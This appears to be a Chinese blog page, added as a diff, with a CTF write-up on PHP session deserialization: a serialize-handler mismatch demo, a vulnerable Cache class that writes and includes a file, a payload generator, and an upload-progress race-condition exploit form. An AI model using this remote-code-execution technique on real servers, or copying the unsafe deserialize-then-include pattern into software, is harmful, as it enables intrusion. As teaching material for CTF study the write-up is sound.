@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html>
+  <head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    
+    <title>PHP-SESSION反序列化——复现巅峰极客一道WEB题 | Xiao Leung&#39;s Blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    
+      <link rel="icon" href="/favicon.png">
+    
+
+    <link rel="stylesheet" href="/css/style.css">
+
+    <link rel="stylesheet" href="/js/google-code-prettify/tomorrow-night-eighties.min.css">
+
+  </head>
+
+  <body>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>
+<header>
+	<a id="logo" href="/" title="Xiao Leung&#39;s Blog">
+	<img src="/favicon.png" alt="Xiao Leung&#39;s Blog"></a>
+	
+	
+		<!--搜索栏-->
+		<i class="js-toggle-search iconfont icon-search"></i>
+
+
+<form class="js-search search-form search-form--modal" method="get" action="http://gushi.li" role="search">
+	<div class="search-form__inner">
+		<div>
+			<i class="iconfont icon-search"></i>
+			<input class="text-input" placeholder="Enter Key..." type="search">
+		</div>
+	</div>
+</form>
+	
+
+	
+		<!--侧边导航栏-->
+		<a id="nav-toggle" href="#"><span></span></a>
+
+<nav>
+	<div class="menu-top-container">
+		<ul id="menu-top" class="menu">
+			
+				
+				<li class="current-menu-item">
+					<a href="https://www.plasf.cn/2019/08/01/HelloWorld/" target="_blank">AboutMe</a>
+				</li>
+			
+				
+				<li class="current-menu-item">
+					<a href="https://www.plasf.cn/HXCTF/" target="_blank">HXCTF</a>
+				</li>
+			
+		</ul>
+	</div>
+</nav>
+	
+
+</header>
+<div class="m-header ">
+	<section id="hero1" class="hero">
+		<div class="inner">
+		</div>
+	</section>
+	
+		<figure class="top-image" data-enable=true></figure>
+	
+</div>
+
+<!--文章列表-->
+<div class="wrapper">
+  
+    <!--文章-->
+<article>
+	
+  
+    <h1 class="post-title" itemprop="name">
+      PHP-SESSION反序列化——复现巅峰极客一道WEB题
+    </h1>
+  
+
+	<div class='post-body mb'>
+		<h1 id="一个例子引入"><a href="#一个例子引入" class="headerlink" title="一个例子引入"></a>一个例子引入</h1><ul>
+<li><p><strong><em>session.php</em></strong></p>
+<pre><code class="php">&lt;?php
+error_reporting(0);
+ini_set(&#39;session.serialize_handler&#39;,&#39;php_serialize&#39;);
+session_start();
+$_SESSION[&#39;session&#39;] = $_GET[&#39;session&#39;];
+?&gt;</code></pre>
+</li>
+<li><p><strong><em>payload.php</em></strong></p>
+<pre><code class="php">&lt;?php
+class XianZhi{
+    public $name;
+    function __wakeup(){
+      echo &quot;Who are you?&quot;;
+    }
+    function __destruct(){
+      echo &#39;&lt;br&gt;&#39;.$this-&gt;name;
+    }
+}
+    $str = new XianZhi();
+    $str-&gt;name = &quot;xianzhi&quot;;
+    echo serialize($str);
+  ?&gt;</code></pre>
+</li>
+<li><p><strong><em>class.php</em></strong></p>
+<pre><code class="php">&lt;?php
+    error_reporting(0);
+  ini_set(&#39;session.serialize_handler&#39;,&#39;php&#39;);
+  session_start();
+    class XianZhi{
+    public $name = &#39;panda&#39;;
+    function __wakeup(){
+      echo &quot;Who are you?&quot;;
+    }
+    function __destruct(){
+      echo &#39;&lt;br&gt;&#39;.$this-&gt;name;
+    }
+  }
+  $str = new XianZhi();
+ ?&gt;</code></pre>
+</li>
+<li><p>payload.php中获取序列化的payload,然后再访问<code>session.php</code>文件传入<code>|</code>+<code>序列化</code>格式的值，然后再次访问<code>class.php</code>文件的时候 会发现页面会多了个”xianzhi”这说明我们传入的值被反序列化了。</p>
+</li>
+</ul>
+<h1 id="巅峰极客"><a href="#巅峰极客" class="headerlink" title="巅峰极客"></a>巅峰极客</h1><ul>
+<li><p>我们看巅峰极客这道题,可以很明显这里使用了一个<code>file_put_contents</code>将内容写到了一个指定地址的地方，那么我们该如何利用呢，那么这里就可以使用session反序列化将我们传入的序列化内容，从而控制Cache类，将类属性改成我们想要的内容，从而达到RCE的效果。问题又来了那么怎么才能控制SESSION呢，这里可以用到 <code>PHP BUG #71101</code> ，也就是常用的SESSION文件包含（上传进度文件）RCE的漏洞，将SESSION传入并导致反序列化。</p>
+<pre><code class="php">&lt;?php
+class Cache{
+    public $data;
+    public $sj;
+    public $path;
+    public $html;
+    function __construct($data){
+        $this-&gt;data[&#39;name&#39;]=isset($data[&#39;post&#39;][&#39;name&#39;])?$data[&#39;post&#39;][&#39;name&#39;]:&#39;&#39;;
+        $this-&gt;data[&#39;message&#39;]=isset($data[&#39;post&#39;][&#39;message&#39;])?$data[&#39;post&#39;][&#39;message&#39;]:&#39;&#39;;
+        $this-&gt;data[&#39;image&#39;]=!empty($data[&#39;image&#39;])?$data[&#39;image&#39;]:&#39;/static/images/pic04.jpg&#39;;
+        $this-&gt;path=Cache_DIR.DS.session_id().&#39;.php&#39;;
+    }
+
+    function __destruct(){
+        $this-&gt;html=sprintf(&#39;&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;LOL&lt;/title&gt;&lt;meta charset=&quot;utf-8&quot; /&gt;&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, user-scalable=no&quot; /&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/main.css&quot; /&gt;&lt;noscript&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/noscript.css&quot; /&gt;&lt;/noscript&gt;   &lt;/head&gt; &lt;body class=&quot;is-preload&quot;&gt;&lt;div id=&quot;wrapper&quot;&gt;&lt;header id=&quot;header&quot;&gt; &lt;div class=&quot;logo&quot;&gt;&lt;span class=&quot;icon fa-diamond&quot;&gt;&lt;/span&gt; &lt;/div&gt;  &lt;div class=&quot;content&quot;&gt;&lt;div class=&quot;inner&quot;&gt;    &lt;h1&gt;Hero of you&lt;/h1&gt;&lt;/div&gt;  &lt;/div&gt;  &lt;nav&gt;&lt;ul&gt;   &lt;li&gt;&lt;a href=&quot;#you&quot;&gt;YOU&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;    &lt;/nav&gt;&lt;/header&gt;&lt;div id=&quot;main&quot;&gt;&lt;article id=&quot;you&quot;&gt;    &lt;h2 class=&quot;major&quot; ng-app&gt;%s&lt;/h2&gt;    &lt;span class=&quot;image main&quot;&gt;&lt;img src=&quot;%s&quot; alt=&quot;&quot; /&gt;&lt;/span&gt; &lt;p&gt;%s&lt;/p&gt;&lt;button type=&quot;button&quot; onclick=location.href=&quot;/download/%s&quot;&gt;下载&lt;/button&gt;&lt;/article&gt;&lt;/div&gt;&lt;footer id=&quot;footer&quot;&gt;&lt;/footer&gt;&lt;/div&gt;&lt;script src=&quot;/static/js/jquery.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/static/js/browser.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/static/js/breakpoints.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/static/js/util.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/static/js/main.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/static/js/angular.js&quot;&gt;&lt;/script&gt;   &lt;/body&gt;&lt;/html&gt;&#39;,substr($this-&gt;data[&#39;name&#39;],0,62),$this-&gt;data[&#39;image&#39;],$this-&gt;data[&#39;message&#39;],session_id().&#39;.jpg&#39;);
+
+        if(file_put_contents($this-&gt;path,$this-&gt;html)){
+            include($this-&gt;path);
+        }
+    }
+}</code></pre>
+</li>
+<li><p>payload</p>
+<pre><code class="php">&lt;?php
+
+class Cache{
+    public $data ;
+    public $sj;
+    public $path = &#39;/Library/WebServer/Documents/ctf/index.php&#39;;
+    public $html;
+
+}
+    $str = new Cache();
+    $str-&gt;data= [
+    &quot;name&quot; =&gt; &quot;payload&quot;,
+    &quot;message&quot; =&gt; &quot;panda&quot;,
+    &quot;image&quot; =&gt; &quot;panda&quot;
+];
+    echo serialize($str);
+
+?&gt;</code></pre>
+</li>
+</ul>
+<ul>
+<li><p>EXP</p>
+<p>最后使用SESSION上传进度，将其包含进SESSION,这里使用条件竞争。</p>
+<pre><code class="php">&lt;form action=&quot;http://10.37.14.49/ctf/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;
+    &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;这里填payload&quot; /&gt;
+    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;
+    &lt;input type=&quot;submit&quot; /&gt;
+&lt;/form&gt;</code></pre>
+</li>
+</ul>
+
+	</div>
+	<div class="meta split">
+		
+			<span>本文总阅读量 <span id="busuanzi_value_page_pv"></span> 次</span>
+		
+		<time class="post-date" datetime="2019-11-01T15:06:32.000Z" itemprop="datePublished">2019-11-01</time>
+	</div>
+</article>
+
+<!--评论-->
+
+	
+<div class="ds-thread" data-thread-key="2019-11-1-PHP-SESSION反序列化——复现巅峰极客一道WEB题" data-title="PHP-SESSION反序列化——复现巅峰极客一道WEB题" data-url="http://www.plasf.cn/2019/11/01/2019-11-1-PHP-SESSION反序列化——复现巅峰极客一道WEB题/"></div>
+<script type="text/javascript">
+
+var duoshuoQuery = {short_name:"yumemor"};
+	(function() {
+		var ds = document.createElement('script');
+		ds.type = 'text/javascript';ds.async = true;
+		ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+		ds.charset = 'UTF-8';
+		(document.getElementsByTagName('head')[0]
+		 || document.getElementsByTagName('body')[0]).appendChild(ds);
+	})();
+</script>
+
+
+  
+</div>
+
+
+  <svg id="bigTriangleColor" width="100%" height="40" viewBox="0 0 100 102" preserveAspectRatio="none">
+    <path d="M0 0 L50 100 L100 0 Z"></path>
+  </svg>
+
+  
+
+
+  <div class="wrapper"></div>
+
+
+
+
+
+<div class="fat-footer">
+	<div class="wrapper">
+		<div class="layout layout--center">
+			<div class="layout__item palm-mb">
+				<div class="media">
+					<img class="headimg" src='/assets/blogImg/litten.png' alt='XiaoLeung'>
+					<div class="media__body">
+						<h4>Xiaoleung&#39;s Blog</h4>
+						<p class='site-description'>Don&#39;t forget why we started</p>
+					</div>
+				</div>
+				<div class="author-contact">
+					<ul>
+						
+							
+							<li>
+				        		<a href="https://github.com/sharpleung" target="_blank">
+				        			
+				        				<i class="iconfont icon-github"></i>
+				        			
+				        		</a>
+				        	</li>
+						
+					</ul>
+				</div>
+			</div>
+		</div>
+	</div>
+</div>
+
+<footer class="footer" role="contentinfo">
+	<div class="wrapper wrapper--wide split split--responsive">
+		
+			<span>本站总访问量 <span id="busuanzi_value_site_pv"></span> 次, 访客数 <span id="busuanzi_value_site_uv"></span> 人次</span>
+		
+		<span>Theme by <a href="http://github.com/justpsvm">justpsvm</a>. Powered by <a href="http://hexo.io">Hexo</a></span>
+	</div>
+</footer>
+
+	<!-－这里导入了 lib.js 里面涵盖了 jQuery 等框架 所以注释掉-->
+	<!--<script src="http://lib.sinaapp.com/js/jquery/2.0/jquery.min.js"></script>-->
+	<script src="/js/lib.js"></script>
+	<script src="/js/google-code-prettify/prettify.js"></script>
+	<script src="/js/module.js"></script>
+	<script src="/js/script.js"></script>
+	
+		<script async src="http://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	
+	<script type='text/javascript'>
+		//代码高亮
+		$(document).ready(function(){
+	 		$('pre').addClass('prettyprint linenums').attr('style', 'overflow:auto;');
+   			prettyPrint();
+		});
+	</script>
+	<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
